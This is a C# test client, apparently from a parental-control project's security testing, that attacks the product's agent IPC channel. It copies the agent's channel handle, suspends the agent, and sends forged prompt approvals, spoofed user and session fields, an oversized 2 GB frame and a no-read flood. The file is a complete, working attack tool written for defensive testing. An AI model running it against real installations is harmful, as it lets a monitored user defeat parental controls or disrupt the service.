// ChannelAttack: a test client of the Agent Channel for VM 102 (session-probe-and-agent-channel, tasks 5.3 and 6.4).
// Run it as Kid in the session of the agent. It plays the child with code: it copies the channel handle of the Session
// Agent with DuplicateHandle (Kid owns the agent process), suspends the agent so that only this tool reads the channel,
// and sends hostile frames. Never put it on the child's PC.
//
// Usage (each command finds the agent of the own session and its --channel value):
//   ChannelAttack status [user]            status poll with a field "user" (default Mama) and "sessionId": 0
//   ChannelAttack prompt <promptId>         answer YES for a prompt ID (for example a prompt to nick)
//   ChannelAttack sessionend <sessionId> [count] [gapSeconds]
//                                           session-end requests with a field "sessionId" (another session)
//   ChannelAttack huge                      a frame length of 2 GB
//   ChannelAttack noread [seconds]          status polls (2 per second), never reads an answer
//   ChannelAttack resume                    resumes each agent process of the own session
// The output goes to stdout and to C:\Users\Public\channel-attack.log.
using System.Buffers.Binary;
using System.ComponentModel;
using System.Diagnostics;
using System.Management;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;

const string LogPath = @"C:\Users\Public\channel-attack.log";

void Log(string line)
{
    var text = $"{DateTime.Now:HH:mm:ss.fff} {line}";
    Console.WriteLine(text);
    try { File.AppendAllText(LogPath, text + Environment.NewLine); } catch { }
}

try
{
    var command = args.ElementAtOrDefault(0) ?? "";
    if (command == "resume")
    {
        foreach (var (pid, _) in FindAgents()) { Native.Resume(pid); Log($"resumed agent pid {pid}"); }
        return 0;
    }

    var (agentPid, handleValue) = FindAgents().FirstOrDefault(a => a.Handle != 0);
    if (agentPid == 0) { Log("no agent with --channel in this session"); return 2; }
    Log($"agent pid {agentPid}, channel handle {handleValue}");
    using var channel = Channel.Steal(agentPid, handleValue);
    Log("handle duplicated; agent suspended");
    // The suspended agent still has one read pending; the first answer goes to it. Send a decoy first.
    channel.Write(Json(new { type = "status", id = 990000 }));
    Thread.Sleep(500);

    switch (command)
    {
        case "status":
        {
            var user = args.ElementAtOrDefault(1) ?? "Mama";
            channel.Write(Json(new { type = "status", id = 990001, user, sessionId = 0 }));
            var answer = channel.ReadAnswer(990001, TimeSpan.FromSeconds(5));
            if (answer is null) { Log("no answer"); return 3; }
            using var doc = JsonDocument.Parse(answer);
            var status = doc.RootElement.GetProperty("status");
            Log($"status with user={user}: username={Text(status, "username")} isRestricted={Text(status, "isRestricted")} " +
                $"remainingSeconds={Text(status, "remainingSeconds")} activePrompt={Text(status, "activePrompt")}");
            return 0;
        }
        case "prompt":
        {
            var promptId = int.Parse(args[1]);
            channel.Write(Json(new { type = "promptAnswer", id = 990002, promptId, response = "YES", turnaroundSeconds = 1 }));
            var answer = channel.ReadAnswer(990002, TimeSpan.FromSeconds(5));
            Log($"prompt answer for prompt {promptId}: {(answer is null ? "no answer" : Encoding.UTF8.GetString(answer))}");
            return 0;
        }
        case "sessionend":
        {
            var sessionId = int.Parse(args[1]);
            var count = int.Parse(args.ElementAtOrDefault(2) ?? "1");
            var gap = int.Parse(args.ElementAtOrDefault(3) ?? "0");
            for (var i = 0; i < count; i++)
            {
                if (i > 0) Thread.Sleep(TimeSpan.FromSeconds(gap));
                var id = 990100 + i;
                channel.Write(Json(new { type = "sessionEnding", id, reason = "logoff", sessionId }));
                var answer = channel.ReadAnswer(id, TimeSpan.FromSeconds(5));
                Log($"session-end request {i + 1} naming session {sessionId}: {(answer is null ? "no answer" : Encoding.UTF8.GetString(answer))}");
            }
            return 0;
        }
        case "huge":
        {
            var header = new byte[4];
            BinaryPrimitives.WriteUInt32LittleEndian(header, 2u * 1024 * 1024 * 1024);
            channel.Write(header);
            Log("sent a frame length of 2 GB");
            var watch = Stopwatch.StartNew();
            var closed = channel.WaitForClose(TimeSpan.FromSeconds(20));
            Log(closed ? $"the service closed the channel after {watch.ElapsedMilliseconds} ms" : "the channel is still open after 20 s");
            return closed ? 0 : 4;
        }
        case "noread":
        {
            var seconds = int.Parse(args.ElementAtOrDefault(1) ?? "120");
            var watch = Stopwatch.StartNew();
            var sent = 0;
            while (watch.Elapsed < TimeSpan.FromSeconds(seconds))
            {
                if (!channel.TryWrite(Json(new { type = "status", id = 991000 + sent }), TimeSpan.FromSeconds(3)))
                {
                    Log($"write failed after {sent} polls and {watch.Elapsed.TotalSeconds:F1} s: the service closed the channel");
                    return 0;
                }
                sent++;
                if (sent % 20 == 0) Log($"{sent} polls sent, none read");
                Thread.Sleep(500);
            }
            Log($"the channel is still open after {sent} polls");
            return 4;
        }
        default:
            Log("unknown command; see the top of Program.cs");
            return 1;
    }
}
catch (Exception ex)
{
    Log("error: " + ex);
    return 9;
}

static string Text(JsonElement element, string name) =>
    element.TryGetProperty(name, out var value) ? value.ToString() : "-";

static byte[] Json(object value)
{
    var json = JsonSerializer.SerializeToUtf8Bytes(value);
    var frame = new byte[4 + json.Length];
    BinaryPrimitives.WriteUInt32LittleEndian(frame, (uint)json.Length);
    json.CopyTo(frame, 4);
    return frame;
}

// The agent processes of the own session, with the handle value of their --channel argument (0 if none).
static List<(int Pid, long Handle)> FindAgents()
{
    var session = Process.GetCurrentProcess().SessionId;
    var result = new List<(int, long)>();
    using var searcher = new ManagementObjectSearcher("SELECT ProcessId, SessionId, CommandLine FROM Win32_Process WHERE Name = 'ParentalControl.Agent.exe'");
    foreach (ManagementObject process in searcher.Get())
    {
        if (Convert.ToInt32(process["SessionId"]) != session) continue;
        var commandLine = process["CommandLine"] as string ?? "";
        var parts = commandLine.Split(' ', StringSplitOptions.RemoveEmptyEntries);
        var index = Array.IndexOf(parts, "--channel");
        long handle = index >= 0 && index + 1 < parts.Length && long.TryParse(parts[index + 1], out var h) ? h : 0;
        result.Add((Convert.ToInt32(process["ProcessId"]), handle));
    }
    return result;
}

/// <summary>
/// The stolen client end. The file object is bound to the completion port of the agent, so this tool uses overlapped
/// I/O with an event whose low bit is set: no completion packet goes to the agent.
/// </summary>
internal sealed class Channel : IDisposable
{
    private readonly IntPtr _handle;
    private readonly List<byte> _buffer = new();

    private Channel(IntPtr handle) => _handle = handle;

    public static Channel Steal(int agentPid, long handleValue)
    {
        var process = Native.OpenProcess(Native.PROCESS_DUP_HANDLE | Native.PROCESS_SUSPEND_RESUME, false, agentPid);
        if (process == IntPtr.Zero) throw new Win32Exception(Marshal.GetLastWin32Error(), "OpenProcess of the agent");
        try
        {
            if (!Native.DuplicateHandle(process, new IntPtr(handleValue), Native.GetCurrentProcess(), out var copy, 0, false, Native.DUPLICATE_SAME_ACCESS))
                throw new Win32Exception(Marshal.GetLastWin32Error(), "DuplicateHandle");
            var status = Native.NtSuspendProcess(process);
            if (status != 0) throw new Win32Exception($"NtSuspendProcess 0x{status:X}");
            return new Channel(copy);
        }
        finally
        {
            Native.CloseHandle(process);
        }
    }

    public void Write(byte[] data)
    {
        if (!TryWrite(data, TimeSpan.FromSeconds(10))) throw new IOException("write failed");
    }

    public bool TryWrite(byte[] data, TimeSpan timeout) => Io(data, data.Length, write: true, timeout, out _);

    /// <summary>Reads frames until the answer with <paramref name="id"/>. Other answers are skipped.</summary>
    public byte[]? ReadAnswer(long id, TimeSpan timeout)
    {
        var watch = Stopwatch.StartNew();
        while (watch.Elapsed < timeout)
        {
            while (TryTakeFrame(out var frame))
            {
                using var doc = JsonDocument.Parse(frame);
                if (doc.RootElement.TryGetProperty("id", out var idElement) && idElement.GetInt64() == id) return frame;
            }
            var chunk = new byte[16 * 1024];
            if (!Io(chunk, chunk.Length, write: false, timeout - watch.Elapsed, out var read) || read == 0) return null;
            _buffer.AddRange(chunk.AsSpan(0, read).ToArray());
        }
        return null;
    }

    /// <summary>True when a read fails with a broken pipe (the service closed its end).</summary>
    public bool WaitForClose(TimeSpan timeout)
    {
        var watch = Stopwatch.StartNew();
        var chunk = new byte[16 * 1024];
        while (watch.Elapsed < timeout)
        {
            if (!Io(chunk, chunk.Length, write: false, timeout - watch.Elapsed, out var read)) return Marshal.GetLastWin32Error() != Native.WAIT_TIMEOUT_CODE;
            if (read == 0) return true;
        }
        return false;
    }

    private bool TryTakeFrame(out byte[] frame)
    {
        frame = [];
        if (_buffer.Count < 4) return false;
        var length = BinaryPrimitives.ReadInt32LittleEndian(_buffer.GetRange(0, 4).ToArray());
        if (_buffer.Count < 4 + length) return false;
        frame = _buffer.GetRange(4, length).ToArray();
        _buffer.RemoveRange(0, 4 + length);
        return true;
    }

    private bool Io(byte[] data, int count, bool write, TimeSpan timeout, out int transferred)
    {
        transferred = 0;
        var overlapped = Marshal.AllocHGlobal(Marshal.SizeOf<Native.OVERLAPPED>());
        var ev = Native.CreateEventW(IntPtr.Zero, true, false, null);
        var pinned = GCHandle.Alloc(data, GCHandleType.Pinned);
        try
        {
            // The low bit of hEvent: no completion packet to the completion port of the agent.
            Marshal.StructureToPtr(new Native.OVERLAPPED { hEvent = ev | 1 }, overlapped, false);
            var ok = write
                ? Native.WriteFile(_handle, pinned.AddrOfPinnedObject(), count, out _, overlapped)
                : Native.ReadFile(_handle, pinned.AddrOfPinnedObject(), count, out _, overlapped);
            if (!ok)
            {
                var error = Marshal.GetLastWin32Error();
                if (error != Native.ERROR_IO_PENDING) { Marshal.SetLastPInvokeError(error); return false; }
                var wait = Native.WaitForSingleObject(ev, (uint)Math.Max(1, timeout.TotalMilliseconds));
                if (wait != 0)
                {
                    Native.CancelIoEx(_handle, overlapped);
                    Native.GetOverlappedResult(_handle, overlapped, out _, true);
                    Marshal.SetLastPInvokeError(Native.WAIT_TIMEOUT_CODE);
                    return false;
                }
            }
            if (!Native.GetOverlappedResult(_handle, overlapped, out var done, false)) return false;
            transferred = done;
            return true;
        }
        finally
        {
            pinned.Free();
            Native.CloseHandle(ev);
            Marshal.FreeHGlobal(overlapped);
        }
    }

    public void Dispose() => Native.CloseHandle(_handle);
}

internal static class Native
{
    public const uint PROCESS_DUP_HANDLE = 0x0040;
    public const uint PROCESS_SUSPEND_RESUME = 0x0800;
    public const uint DUPLICATE_SAME_ACCESS = 0x2;
    public const int ERROR_IO_PENDING = 997;
    public const int WAIT_TIMEOUT_CODE = 258;

    [StructLayout(LayoutKind.Sequential)]
    public struct OVERLAPPED
    {
        public IntPtr Internal;
        public IntPtr InternalHigh;
        public uint Offset;
        public uint OffsetHigh;
        public IntPtr hEvent;
    }

    public static void Resume(int pid)
    {
        var process = OpenProcess(PROCESS_SUSPEND_RESUME, false, pid);
        if (process == IntPtr.Zero) return;
        try { NtResumeProcess(process); }
        finally { CloseHandle(process); }
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint access, bool inherit, int pid);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool DuplicateHandle(IntPtr sourceProcess, IntPtr source, IntPtr targetProcess, out IntPtr target,
        uint access, bool inherit, uint options);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr handle);

    [DllImport("ntdll.dll")]
    public static extern int NtSuspendProcess(IntPtr process);

    [DllImport("ntdll.dll")]
    public static extern int NtResumeProcess(IntPtr process);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern IntPtr CreateEventW(IntPtr attributes, bool manualReset, bool initialState, string? name);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteFile(IntPtr file, IntPtr buffer, int count, out int written, IntPtr overlapped);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool ReadFile(IntPtr file, IntPtr buffer, int count, out int read, IntPtr overlapped);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool GetOverlappedResult(IntPtr file, IntPtr overlapped, out int transferred, bool wait);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr handle, uint milliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CancelIoEx(IntPtr file, IntPtr overlapped);
}
